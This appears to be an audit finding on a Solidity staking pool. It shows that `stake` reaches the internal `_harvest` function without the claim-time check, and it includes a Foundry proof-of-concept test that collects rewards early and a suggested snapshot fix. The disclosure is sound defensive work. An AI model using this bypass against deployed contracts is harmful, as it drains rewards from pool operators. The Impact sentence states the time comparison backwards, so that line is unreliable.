## Description
The `onlyClaimableTime` modifier is implemented in the `harvest` function. However, this
is problematic as the `stake` function directly calls the `_harvest` function, bypassing this
modifier.

## Vulnerability Details

The `onlyClaimableTime` modifier checks if the `claimableTime` value has been reached.

```solidity
modifier onlyClaimableTime {
    require(claimableTime > 0 && block.timestamp >= claimableTime, "Harvest: unclaimable time");
    _;
}
```

This modifier is only implemented in the `harvest` function.

```solidity
function harvest() external whenNotPaused nonReentrant onlyClaimableTime {
    _harvest();
}

function _harvest() internal {
    unchecked {
        address _user = msg.sender;
        uint256 _u2uRewards = _pendingRewards(_user);
        users_[_user].latestHarvest = block.timestamp;
        if (_u2uRewards > 0) {
            users_[_user].totalClaimed += _u2uRewards;
            // Handle send rewards
            TransferHelper.safeTransferNative(_user, _u2uRewards);
            emit Harvest(_user, _u2uRewards);
        }
    }
}
```

Taking a look at the `stake` function below:

```solidity
function stake(
    uint256 _amount,
    uint256 _expiresAt,
    bytes memory _signature
) external whenNotPaused nonReentrant {
    require(block.timestamp < endTime, "Pool is ended");
    require(_amount >= MIN_STAKE_AMOUNT, "not enough minimum stake amount");
    if (!ignoreSigner) {
        require(!usedSignatures[_signature], "Stake: signature reused");
        usedSignatures[_signature] = true;
        address _signer = _verifyStake(_expiresAt, _signature);
        require(hasRole(POOL_SIGNER, _signer), "Stake: only signer");
        require(_expiresAt >= block.timestamp, "Stake: signature expired");
    }
    _stake(_amount);
}

function _stake(uint256 _amount) internal {
    unchecked {
        _harvest();
        // rest of the function
    }
}
```

It is observed that this function directly makes a call to the `_harvest` function, bypassing the `onlyClaimableTime` modifier. This means that users can claim their rewards before `claimableTime` is reached by staking the minimum amount that is required.

This vulnerability also exists in the `unstake` function. However, since this function checks if the `endTime` has been reached, it is not a realistic attack vector as long as `claimableTime` is less than the `endTime`.

## Proof of Concept

An example of a test that simulates the vulnerability is below.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../IncentivePool.sol";
import "../../libs/TransferHelper.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract IncentivePoolTest is Test {
    IncentivePool public incentivePool;
    MockERC20 public pUSDT;

    address user = address(0x1);
    address admin = address(0x2);

    uint256 constant INITIAL_PUSDT_SUPPLY = 1_000_000 * 1e6;
    uint256 constant START_TIME = 1_700_000_000;
    uint256 constant STAKE_AMOUNT = 1000 * 1e6;

    function setUp() public {
        // Deploy Mock pUSDT token and mint to user
        pUSDT = new MockERC20("Mock pUSDT", "pUSDT");
        pUSDT.mint(user, INITIAL_PUSDT_SUPPLY);

        // Deploy IncentivePool contract
        incentivePool = new IncentivePool(address(pUSDT), START_TIME);

        // Assign DEFAULT_ADMIN_ROLE to admin
        incentivePool.grantRole(incentivePool.DEFAULT_ADMIN_ROLE(), admin);

        // Set ignoreSigner to true
        vm.prank(admin);
        incentivePool.setIgnoreSigner(true);

        // Set claimableTime
        vm.prank(admin);
        incentivePool.setClaimableTime(START_TIME + 500);

        // Approvals
        vm.prank(user);
        pUSDT.approve(address(incentivePool), type(uint256).max);

        // Fund the IncentivePool contract
        vm.deal(address(incentivePool), 100000 ether);
    }
    
    function testStakeTwiceBeforeClaimableTimeRewardsDistributed() public {
        // Set claimableTime in the future
        uint256 futureClaimableTime = START_TIME + 1000;
        vm.prank(admin);
        incentivePool.setClaimableTime(futureClaimableTime);

        // Forward time to after start time but still before claimableTime
        vm.warp(START_TIME + 1);

        // Initial stake by user
        uint256 initialStakeAmount = 1000 * 1e6; // 1,000 pUSDT
        vm.prank(user);
        incentivePool.stake(initialStakeAmount, START_TIME + 1000, "");

        // Cache user’s balance
        uint256 initialTotalClaimed = user.balance;

        // Move forward in time, but still before claimableTime
        vm.warp(START_TIME + 500);

        // Stake again with an additional amount
        uint256 additionalStakeAmount = 500 * 1e6; // 500 pUSDT
        vm.prank(user);
        incentivePool.stake(additionalStakeAmount, START_TIME + 1500, "");

        // Cache user’s new balance
        uint256 totalClaimedAfterSecondStake = user.balance;

        // Verify rewards were distributed on the second stake
        assertGt(totalClaimedAfterSecondStake, initialTotalClaimed);

        // Print user’s claimed rewards for verification
        console.log("User's rewards after first stake:", initialTotalClaimed);
        console.log("User's rewards after second stake:", totalClaimedAfterSecondStake);
    }
}
```

## Impact

Users can claim rewards even if `claimableTime` is less than the `block.timestamp`.

## Recommendation

Change the `_stake` and `_unstake` functions so that these functions keep track of how many rewards are owed to the user at that time instead of calling the `_harvest` function. With this change, the `_harvest` function should transfer users the owed rewards and the pending rewards. Implement correct calculations to prevent double claiming of rewards.

In short, implement a snapshot mechanic that keeps track of rewards that are owed to users.
